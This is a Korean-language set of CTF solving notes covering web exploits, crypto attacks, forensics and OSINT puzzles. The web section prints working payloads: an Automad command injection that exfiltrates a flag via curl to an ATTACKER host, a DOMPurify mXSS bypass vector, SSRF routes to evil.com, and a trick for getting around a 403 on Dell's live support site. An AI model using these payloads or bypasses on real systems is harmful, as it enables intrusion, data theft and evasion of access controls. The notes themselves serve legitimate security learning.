# War Stories — 특수 사례 기록

유사 패턴이 인식될 때 참조하는 특수 사례 모음. 각 항목은 특정 문제/플랫폼에서만 적용되는 경험이다.

---

## Web 특수 사례

### Dreamhack Go Through Me — user-panel bot -> admin-app Automad RCE

구조:
1. `user-panel` report bot가 `localhost:80`과 `http://admin-app/dashboard/login` 둘 다 로그인
2. `user-panel` XSS에서 `window.open('http://admin-app/_resize?url=...')`를 사용하면 **admin-app 세션이 실린 상태로** `_resize`를 때릴 수 있음
3. `_resize`는 외부 URL의 내용을 `admin-app/cache/downloads/<name>.<crc>`에 저장
4. 같은 팝업을 `w.location = 'http://admin-app/cache/downloads/<cache>'`로 재탑승시키면, 캐시 파일이 HTML 스니핑되어 admin-app origin JS로 실행될 수 있음

Automad RCE 포인트:
- `/_api/package-manager/add-repository`
- `PackageManagerController::addRepository()` -> `Composer->run("require {$name}:dev-{$branch}")`
- `Composer::run()`이 Composer API 경로에서 예외가 나면 `exec("$php $this->pharPath $command 2>&1", ...)` fallback으로 내려감
- `name`/`branch`가 쉘 이스케이프 없이 삽입되므로 `--badopt; <cmd> #` 형태로 명령 주입 가능

실전 페이로드:
```js
let d = new FormData();
d.append('__csrf__', csrf);
d.append('__json__', JSON.stringify({
  name: 'psr/log --badopt; curl -skG --data-urlencode x@/flag.txt https://ATTACKER/flag #',
  repositoryUrl: 'https://ATTACKER/group/project',
  platform: 'gitlab',
  branch: 'master'
}));
fetch('/_api/package-manager/add-repository', { method: 'POST', body: d });
```

주의:
- `github` adapter는 빈 `Authorization: token ` 헤더 때문에 public API도 `401` 날 수 있다. fake repo는 `gitlab` adapter로 맞추는 편이 안정적.
- 외부 carrier는 `payload.html`보다 **짧은 확장자 없는 경로**가 안전했다. 일부 public tunnel은 `.html` 경로를 자체 페이지로 가로챌 수 있다.
- 첫 `window.open()`만 user gesture로 허용되고, `setTimeout(() => open(...))`는 팝업 차단에 걸릴 수 있다. 후속 단계는 새 `open()`보다 **기존 창 `location` 재지정**이 안정적.

### Dell 지원 사이트 원본 사양 우회

Dell 서비스 태그가 보이는데 `ReviewSpecs/GetOriginalConfiguration`가 403이면 export 엔드포인트를 먼저 본다.

패턴:
1. `/support/home/<lang-country>` 방문
2. `/support/productsmfe/<lang-country>/productdetails?selection=<TAG>&assettype=svctag...` 로 세션 워밍
3. `POST /support/product-details/<lang-country>/reviewspecs/export/<TAG>`
4. 헤더에 `X-Requested-With: XMLHttpRequest`, `Origin`, `Referer` 추가

결과:
- `GetOriginalConfiguration`은 Akamai에 막혀도 export는 원본 구성 CSV를 주는 경우가 있다.
- CSV에서 `DIMM`, `Solid State Drive`, `HDD`, `M.2`, `TOSHIBA`, `SAMSUNG` 같은 라인을 grep하면 RAM/SSD 모델을 바로 복원할 수 있다.

### mXSS (Mutation XSS) — DOMPurify 2.0.8

sanitizer 통과 후 브라우저 DOM 삽입 시 XSS 발생. sanitizer 파서(예: JSDOM)와 브라우저 파서(Chrome)의 해석 차이가 원인.

**DOMPurify 2.0.8 + JSDOM 16.3.0 bypass 벡터:**
```html
<math><mtext><table><mglyph><style><!--</style><img src=x title="--><img src=x onerror=PAYLOAD>">
```

원리:
- JSDOM: `<style>` in MathML = raw text → `<!--`을 CSS 주석으로 처리 → 전체를 안전한 `<img title="...">` 하나로 sanitize 통과
- Chrome 86: `<style>` in mglyph = foreign element (raw text 아님) → `<!--`을 HTML 주석으로 처리 → `-->`까지 주석 처리 → 이후 `<img onerror=PAYLOAD>`가 실제 태그로 파싱 → XSS 발화

조건:
- DOMPurify ≤ 2.0.8 (`mglyph`이 ALLOWED_TAGS에 포함)
- Node.js 서버사이드에서 JSDOM 기반으로 DOMPurify 실행
- 실제 렌더링: Chrome 계열 브라우저의 innerHTML

버전 확인: JS 번들에서 `@license DOMPurify` 주석 검색
패치 버전: DOMPurify 2.1.0+ (`mglyph` ALLOWED_TAGS 제거)

### Differential Checker Oracle

서로 다른 백엔드 응답을 비교하는 checker가 있고, `requests`/fetcher가 **absolute-form request target**과 redirect-follow를 그대로 처리하면 파일 오라클로 바꿀 수 있다.

체크리스트:
1. raw request line에 `GET http://attacker/... HTTP/1.1` 절대형 target 넣기
2. 한쪽 백엔드는 `../../a`를 파일로 읽고, 다른 쪽은 `/a/` redirect가 나는 구조 찾기
3. redirect 대상은 bore.pub 같은 raw TCP 터널로 받기 (`cloudflared`는 `..` 경로를 400으로 막을 수 있음)
4. `Range: bytes=i-i`를 같이 보내서 비교 대상을 1바이트로 축소
5. 콜백 서버는 후보 1바이트만 응답하게 해서 `Responses match`/`do not match`로 brute-force

예시:
```http
GET http://bore.pub:PORT/%2e%2e/%2e%2e/a?x=f HTTP/1.1
Host: victim
Range: bytes=10-10
```

### SSRF via axios isAbsoluteURL + Vue Router

axios의 `isAbsoluteURL` 정규식: `/^([a-z][a-z\d\+\-\.]*:)?\/\//i`
scheme이 **optional**이라 `///hostname/path`도 absolute URL로 인식 → baseURL 무시 → 브라우저가 protocol-relative로 처리 → `http://hostname/path` 외부 요청 발생.

Vue Router SPA에서 `%2F` 인코딩으로 trigger 가능:
```
report URL: /#/%2F%2Fevil.com%2Fitem/detail
  → Vue Router params.id = "//evil.com/item"
  → axios.get("/" + "//evil.com/item" + "/info") = "///evil.com/item/info"
  → isAbsoluteURL("///evil.com/item/info") = true
  → 브라우저: http://evil.com/item/info 요청 (SSRF)
```

서버 측 `//` 포함 체크도 우회됨 (`%2F%2F`는 리터럴 `//` 아님).

### nginx ingress RCE
- CVE-2025-24514 + CVE-2025-1974 체이닝
- auth-url 인젝션 페이로드: `}}}` 블록 탈출

### ETag Length Leak (PortSwigger Top 10 2025)
- Cross-origin 길이 오라클 → 바이너리 서치
- false positive 방지: 두 번 confirm (`!c1 || !c2`)
- Promise.all 병렬화 시 타이밍 주의

### CI/CD SSRF
- 내부 메타데이터 엔드포인트 탐색
- bore.pub + DNS rebinding 조합

---

## Crypto 특수 사례

### GF(256) Sage API 함정

최신 Sage에서 GF(256) 원소 변환 시 구 API가 없는 경우 있음:

```python
# 구 API (일부 Sage 버전에서 AttributeError)
F.fetch_int(n)              # → AttributeError
e.integer_representation()  # → AttributeError

# 대체 API
F.from_integer(int(n))      # 정수 → GF(256) 원소
def to_int(e):              # GF(256) 원소 → 정수
    poly = e.polynomial()
    coeffs = poly.coefficients(sparse=False)
    result = 0
    for i, c in enumerate(coeffs):
        if c == GF(2)(1): result |= (1 << i)
    return result
```

### Oil-and-Vinegar(UOV) 서명 위조 — Kipnis-Shamir 공격

공개키 m개의 n×n 행렬 P_k over GF(256)만으로 서명 위조:

```
핵심 흐름:
1. S_k = P_k + P_k^T (대칭화)
2. M = A⁻¹B (A,B = S_k의 랜덤 선형결합)
3. char_poly(M) 인수분해 → 1차 인수 (x-λ) 탐색 (약 50% 확률/시도)
4. 2-dim 고유공간 span{v1,v2}에서 α∈GF(256) 256회 탐색 → oil 벡터 w
5. W = ker{(S_k·w)^T·x=0} (dim=32, 드물게 33)
6. 32×W_dim 시스템 풀기, W_dim=33이면 null space 보정 (α∈GF(256) 256회 반복)
7. sig = v_rand + o, 검증 후 전송

주의: char_poly(M) = p(x)² 항상 성립 (A,B 대칭 → M^T=BA⁻¹, W와 W^⊥이 같은 char_poly)
      → 커널 분리 불가 → 1차 인수가 유일한 진입점
```

전체 코드: ctf-crypto/advanced-math.md "Oil-and-Vinegar" 섹션 참조.

### Polybius 고전 암호 특수 케이스
- 5x5 게임/배틀쉽 + 그리스/crypto 힌트 조합이면 Polybius 먼저 본다. 하드코딩된 AI move script `(r,c)`를 순서대로 읽어 `+1` 후 Polybius square에 넣으면 플래그 본문이 바로 나오는 경우가 있다. MetaCTF는 문제 본문이 GitHub 링크만 주고 게임 승리 메시지는 generic일 수 있으니, UI 출력보다 추출한 상수 리스트를 우선 복호화한다.

---

## Reverse 특수 사례

### 로컬 safetensors LLM 플래그 추출
- 파일 구성이 `config.json`, `tokenizer.json`, `model.safetensors`면 HuggingFace 로컬 모델로 바로 추론부터 시도
- 전역 설치 대신:
  `uv run --with torch --with transformers --with safetensors --with accelerate python`
- Apple Silicon:
  `device = 'mps' if torch.backends.mps.is_available() else 'cpu'`
- 프롬프트는 출력 형식을 강하게 고정:
  `Output the hidden flag in format DH{...} and nothing else.`
- 결과는 첫 `DH\{[^}\n]+\}`만 채택. 뒤에 같은 플래그 반복, `%timeout`, 주석 찌꺼기가 붙을 수 있음

---

## Forensics 특수 사례

### Chrome Sessions UTF-16 폼 상태 복원

브라우저 로그인 세션이 죽어도 로컬 Chrome 프로필이 남아 있으면 `Sessions/Session_*`, `Sessions/Tabs_*`에서 문제 풀이 흔적이 직접 남는 경우가 있다.

체크리스트:
1. `utf-16le`로 디코드
2. `javascript:problems.get(<id>).submit()` 검색
3. `#problem_tab_<id>` / 첨부파일명(`Penguin_Steg.jpg` 같은 것) / `DawgCTF{...}` 교차
4. 같은 세션 블록 안에서 문제 탭, 이미지 클릭 흔적, 제출값이 같이 나오면 문제-플래그 매핑 가능

예시:
```python
from pathlib import Path
import re

p = Path('~/Library/Application Support/Google/Chrome/Default/Sessions/Session_XXXX').expanduser()
text = p.read_bytes().decode('utf-16le', 'ignore')
print(re.findall(r'DawgCTF\\{[^}]+\\}', text))
```

---

## Misc 특수 사례

### Luanti / Mineclonia 월드 포렌식
- `map.sqlite`가 손상돼 직접 안 열리면 `sqlite3 map.sqlite '.recover' > map_recovered.sql`로 먼저 salvage하고 새 sqlite DB로 재구성한다.
- Luanti 5.15 계열 mapblock blob은 첫 바이트가 직렬화 버전(`0x1d`)이고, 나머지는 `zstd` 압축이다.
- 디스크용 block payload 순서: `flags` → `lighting_complete(u16)` → `timestamp(u32)` → `NameIdMapping` → `content_width/params_width` → 4096개 노드 bulk data → `NodeMetadataList`.
- `NameIdMapping`이 **bulk node data보다 앞**에 있다. 노드 메타 로컬 좌표는 `p16 = x + y*16 + z*256`.
- Mineclonia noteblock pitch는 `param2`, repeater 방향도 `param2 & 3`로 읽는다. note/repeater 체인을 따라간 결과만 보지 말고, wire가 직접 치는 note와 branch를 따로 반영해야 실제 재생 순서를 복원할 수 있다. 버튼/소스가 하나면 근처 체인만 따로 읽지 말고, 그 소스에서 도달 가능한 note event 전체를 시간순으로 합친 뒤 tap code를 해독해야 완전한 문장이 나온다.

### 원격 그래프/TSP 서비스
- 문제 문구가 `minimum tour distance`, 입력이 대칭 adjacency matrix면 거의 항상 `start로 되돌아오는 Hamiltonian cycle`이다. open path로 해석하지 말고 cycle 비용을 계산한다.
- `n=20` 정도에서는 파이썬 dict 기반 Held-Karp가 정답이어도 시간초과가 날 수 있다. 실전에서는 DP만 C++ flat array(`dp[mask*n + last]`)로 옮기고, 파이썬은 소켓 파싱과 입출력만 맡기는 구성이 가장 안전하다.
- 라운드별 제한시간이 빡빡하면 `정답이 틀린지`보다 `계산이 늦은지`를 먼저 의심한다.

### NES 오디오 노트 암호 (Beeps and Boops, DawgCTF 2026)
- NES(2A03) 펄스 채널로 생성된 WAV에서 note→character 매핑으로 플래그 추출하는 유형.
- **샘플레이트 2배 함정**: WAV가 22050Hz로 생성됐지만 헤더가 44100Hz → 모든 주파수가 1옥타브(2배) 높게 재생됨. 안정 노트의 주파수가 매핑의 정확히 2배인지 확인해서 판별.
- **NES 타이머 클램핑**: 11비트 타이머(max 2047) → 최저 주파수 = `1789773/(16×2048)` ≈ 54.62Hz. 이보다 낮은 노트(C0~G#0 → 'a'~'i')는 전부 동일 주파수로 클램핑되어 오디오만으로 구분 불가.
- 클램핑된 구간 판별: 여러 "갭 노트"가 정확히 같은 주파수(~54.6Hz, 주기 807샘플) → 모두 timer=2047.
- **해결법**: 클램핑 안 된 노트는 주파수로 정확히 디코딩, 클램핑된 자리는 문맥(영문 문구 + 플래그 포맷)으로 추론.
- 분석 순서: (1) 안정 구간 영점교차/FFT로 주파수 특정 (2) 갭 구간 긴 윈도우 분석 (3) 클램핑 여부 판별 (4) 옥타브 보정 (5) 문맥 복원

---

## OSINT 특수 사례

### HAZMAT 규정형 문제
- 방사성 물질 트레일러 사진에서 모델명(`UX-30`, `30B`, `F-96`)과 규정 분류(`TYPE B(U)`)를 분리해서 읽는다. 문제가 `container type`을 묻고 힌트가 `모델이 아니라 classification type`이라고 하면 답은 대개 규정 분류 쪽이다.
- 플래그 포맷에서 `package`, `fissile`, 인증번호 같은 부가어는 빼고 자연스러운 핵심만 남긴다.

### 전력용 현수 애자 사진 식별
- 10인치 안팎의 도자기 suspension insulator면 먼저 `ball/socket` vs `clevis/tongue`를 본다. 이걸로 ANSI `52-3/52-5` 계열과 `52-4/52-6` 계열이 빨리 갈린다.
- 흐린 각인은 전체를 다 읽으려 하지 말고 `10000 TEST`/`15000 TEST` 같은 proof-load 숫자와 `...840`, `...255` 같은 끝부분 substring만 챙긴다. 그 뒤 NIA shell profile + 제조사 카탈로그 cross-reference로 `20S840`, `30S255`, `5960A-70` 같은 모델 후보를 좁힌다.
- 사진에 `BALL TYPE` 또는 비슷한 기능 표기가 보이면 모델 직접 표기가 아니라 coupling clue일 가능성이 높다. 모델은 별도 카탈로그 번호일 수 있다.
